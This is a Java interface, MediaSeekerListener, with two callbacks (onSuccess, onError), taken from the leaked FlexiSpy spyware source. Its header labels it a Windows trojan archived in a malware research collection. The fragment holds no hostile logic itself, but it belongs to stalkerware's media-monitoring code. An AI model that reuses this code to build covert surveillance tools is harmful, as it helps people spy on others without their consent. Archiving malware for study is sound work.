/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.mediamon.seeker;

import com.vvt.mediamon.info.MediaInfoType;

public interface MediaSeekerListener {

	public void onSuccess(MediaSeekerInfo info);
	public void onError(Exception e, MediaInfoType type);
}
